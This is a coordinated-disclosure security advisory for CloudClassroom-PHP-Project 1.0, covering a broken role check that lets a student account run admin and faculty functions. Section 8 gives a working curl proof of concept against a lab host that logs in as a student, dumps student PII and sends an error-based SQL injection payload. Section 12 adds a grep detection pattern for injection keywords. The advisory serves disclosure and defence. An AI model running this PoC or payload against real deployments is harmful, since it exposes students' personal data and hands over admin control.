# Security Advisory — Role segregation breakdown / Vertical privilege escalation

> **Identifier:** Pending CVE assignment / Internal ID **CC-2026-25**
> **Publication Date:** 02/08/2026
> **Last Updated:** 02/08/2026
> **Severity:** High
> **CVSS:** 8.8 — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`
> **CWE:** CWE-269: Improper Privilege Management, CWE-862: Missing Authorization
> **Status:** Unpatched

---

## 1. Executive Summary

A vulnerability was identified in **CloudClassroom-PHP-Project 1.0** (Vishal Mathur — `mathurvishal`), in the component **(all admin/faculty pages)**, that allows **an attacker (Low-privilege account (student) — obtainable via self-registration; user interaction: None)** to exploit a **Missing Function-Level Access Control / Vertical Privilege Escalation** flaw.

Roles use distinct session variables (`umail`/`fidx`/`sidx`), but guards only redirect without `exit` (item 00) and do not verify correct role. User authenticated as student executes all admin and teacher functions.

Successful exploitation may result in **Student gains full admin/teacher capability (C:H/I:H/A:H): CRUD records, account creation, grades, credential dump.**

Disclosure follows responsible/coordinated policy; formal vendor notification is planned in the disclosure package (see sections 13 and 14). As of now no patch is available.

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---:|---:|---|
| CloudClassroom-PHP-Project | 1.0 (and prior) | None | Affected |
| Component: (all admin/faculty pages) | 1.0 | None | Affected |

- **Repository / Ecosystem:** https://github.com/mathurvishal/CloudClassroom-PHP-Project
- **Evaluated Stack:** PHP + MySQLi, Apache/2.4.41 (Ubuntu), MariaDB 10.3.39

### Unaffected Products

- No other version/product evaluated in this advisory.

---

## 3. Vulnerability Description

The vulnerability occurs due to **Missing Function-Level Access Control / Vertical Privilege Escalation** in the component **(all admin/faculty pages)**.

Roles use distinct session variables (`umail`/`fidx`/`sidx`), but guards only redirect without `exit` (item 00) and do not verify correct role. User authenticated as student executes all admin and teacher functions.

**Root cause (source code snippet):**

**`addnewfaculty.php:4-8 / studentdetails.php:4-8`**

```php
if($_SESSION["umail"]==""||$_SESSION["umail"]==NULL){header('Location:AdminLogin.php');}
// student has 'sidx' filled and 'umail' empty -> header fires, but admin function EXECUTES
```

### Necessary Conditions

- Authentication: Low-privilege account (student) — obtainable via self-registration
- User Interaction: None
- Attack Vector: Remote (network) — method GET/POST
- Preconditions: Possess any student account (self-registration in registrationform.php is trivial).

---

## 4. Impact

Exploitation may allow:

- Student gains full admin/teacher capability (C:H/I:H/A:H): CRUD records, account creation, grades, credential dump

### Impact on Confidentiality

High — an attacker can read sensitive system data (PII, credentials, business data).

### Impact on Integrity

High — data, configuration or records can be created, altered or removed arbitrarily.

### Impact on Availability

High — service or data can be interrupted, degraded or destroyed.

---

## 5. Classification

### CVSS

- **Score:** 8.8
- **Severity:** High
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`

| Metric | Value |
|---|---|
| Attack Vector (AV) | Network (N) |
| Attack Complexity (AC) | Low (L) |
| Privileges Required (PR) | Low (L) |
| User Interaction (UI) | None (N) |
| Scope (S) | Unchanged (U) |
| Confidentiality (C) | High (H) |
| Integrity (I) | High (H) |
| Availability (A) | High (H) |

### CWE

- CWE-269: Improper Privilege Management
- CWE-862: Missing Authorization

### CAPEC

- **CAPEC-122 – Privilege Abuse**
- **CAPEC-1 – Accessing Functionality Not Properly Constrained by ACLs**

---

## 6. Exploitation Scenario

A possible exploitation scenario occurs as follows:

1. Authenticate as legitimate student (studentlogin.php).
2. With student cookie, request admin READ page (studentdetails.php).
3. Confirm access to PII/passwords (admin function under student session).
4. With same cookie, invoke admin WRITE sink (addnewfaculty.php) — error-based non-destructive.

---

## 7. Technical Evidence

### Affected Component

```text
File(s): (all admin/faculty pages)
Parameter(s): —
Method: GET/POST · Authentication: Low-privilege account (student) — obtainable via self-registration
```

### Example Request

```http
POST /(all admin/faculty pages) HTTP/1.1
Host: 192.168.95.131:9292
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<session — dispensable via item 00 (Broken Access Control)>

<form fields>
```

### Observed Response

```text
Student session read all student PII and executed admin sink -> XPATH '~ccuser@127.0.0.1'.
```

### Result

Reproduced live in authorized lab (http://192.168.95.131:9292/) on 02/08/2026, in a non-destructive manner. Observed behavior confirms the Missing Function-Level Access Control / Vertical Privilege Escalation flaw.

**a) Execution in browser** (real server response rendered, with evidence band):

<img width="1180" height="1294" alt="evidencia-web-25-broken-role-segregation" src="https://github.com/user-attachments/assets/1333ee6c-7f92-44d0-8789-54ca97b1ab46" />

**b) Vulnerable code line** (`(all admin/faculty pages)`):

<img width="2360" height="920" alt="evidencia-codigo-25-broken-role-segregation" src="https://github.com/user-attachments/assets/c46b8f70-d22f-46f0-aead-40d360451f8d" />

---

## 8. Proof of Concept

The PoC below demonstrates only vulnerable behavior and should be used exclusively in authorized environments. Executable and non-destructive script: **`poc.sh`**.

```bash
curl -s -c stud.jar -X POST http://192.168.95.131:9292/loginlinkstudent.php \
  --data-urlencode "sid=harsh@ics.com" --data-urlencode "pass=1234"
curl -s -b stud.jar http://192.168.95.131:9292/studentdetails.php | grep "@ics.com"
curl -s -b stud.jar http://192.168.95.131:9292/addnewfaculty.php \
  --data-urlencode "fname=a'+extractvalue(1,concat(0x7e,current_user()))+'" \
  --data-urlencode "faname=x&addrs=x&gender=Male&phno=1&jdate=2000-01-01&city=x&pass=x&addnewfaculty=1"
```

### Expected Result

```text
Student session read all student PII and executed admin sink -> XPATH '~ccuser@127.0.0.1'.
```


### PoC Limitations

- Does not cause intentional unavailability.
- Does not remove or modify third-party data (state injections are restored; error-based aborts before persisting).
- Does not create persistence or backdoor.
- Does not contain real credentials (lab test data only).
- Does not automate mass exploitation.

---

## 9. Reproduction Steps

1. Access an instance of **CloudClassroom-PHP-Project 1.0**.
2. Configure the prerequisite: Possess any student account (self-registration in registrationform.php is trivial).
3. Access the component **(all admin/faculty pages)** (parameter(s): —).
4. Send the request/input described in sections 7 and 8.
5. Observe the vulnerable result: Student session read all student PII and executed admin sink -> XPATH '~ccuser@127.0.0.1'.
6. Compare with expected safe behavior (properly validated/sanitized/authorized input, without payload reflection or unintended execution).

---

## 10. Mitigation

Until the definitive fix is applied, recommended:

- `exit;` after each guard (item 00).
- Affirmative role verification per page (middleware/RBAC).
- Principle of least privilege.

Additional compensatory measures:

- Restrict access to affected component (network/ACL/WAF).
- Apply WAF/reverse proxy rules to block known attack patterns.
- Review associated permissions and privileges; invalidate potentially exposed sessions/credentials.
- Maintain logs and evidence for investigation.

> Mitigations reduce risk but may not completely eliminate the vulnerability.

---

## 11. Fix

**No official fix available as of this advisory date (unpatched product).**

When made available, recommended:

1. Update to patched version or later.
2. Restart affected services, if necessary.
3. Invalidate old sessions and credentials.
4. Review logs prior to update.
5. Confirm vulnerable behavior can no longer be reproduced.

### Recommended Change to Vendor

- `exit;` after each guard (item 00).
- Affirmative role verification per page (middleware/RBAC).
- Principle of least privilege.

---

## 12. Detection and Indicators

Possible exploitation indicators:

- Access to `(all admin/faculty pages)` without valid session (HTTP 302 responses accompanied by full body) or by wrong role/privilege.

### Example Log Search

```text
grep -Ei "(union|select|extractvalue|concat|<script|onerror|onload|</textarea)" access.log | grep "(all admin/faculty pages)"
```

---

## 13. Disclosure Timeline

| Date | Event |
|---|---|
| 02/08/2026 | Vulnerability identified (static analysis) |
| 02/08/2026 | Confirmed dynamically in authorized lab |
| 02/08/2026 | Re-validated live with evidence (browser + code) |
| 02/08/2026 | Disclosure package prepared (this advisory) |
| (pending) | Vendor notification |
| (pending) | CVE requested/reserved |
| (pending) | Fix made available |
| (pending) | Advisory publication |

---

## 14. Vendor Communication

- **Vendor:** Vishal Mathur (`mathurvishal`)
- **Channel used:** Private GitHub Security Advisory of repository / maintainer email (see `VENDOR-EMAIL.md`)
- **Date of first notification:** (pending)
- **Response status:** Awaiting notification/response
- **Vendor positioning:** N/A at this time

---

## 15. Credits

The vulnerability was identified and reported by:

- **Researcher:** vinniboy021@gmail.com
- **Organization:** Independent security research
- **Contact:** vinniboy021@gmail.com

---

## 16. References

- https://cwe.mitre.org/
- https://www.first.org/cvss/calculator/3.1
- https://cvefeed.io/vuln/product/161371/vishalmathurcloudclassroom-php_project/
- https://github.com/mathurvishal/CloudClassroom-PHP-Project
- https://www.first.org/cvss/calculator/3.1

---

## 17. Revision History

| Version | Date | Change |
|---|---|---|
| 1.0 | 02/08/2026 | Initial publication |

---

## 18. Legal Notice

This advisory is published for educational, defensive and security improvement purposes.

Information presented was obtained in authorized environment and disclosed responsibly or coordinately. The author does not encourage use of this information for unauthorized access, service interruption, privacy violation or any illegal activity.

Use of information in this document is solely the reader's responsibility.

---

## 19. Contact

For corrections, updates or additional information:

- **Emails:** rmsbpro@gmail.com and vinniboy021@gmail.com
- **Repository:** https://github.com/mathurvishal/CloudClassroom-PHP-Project
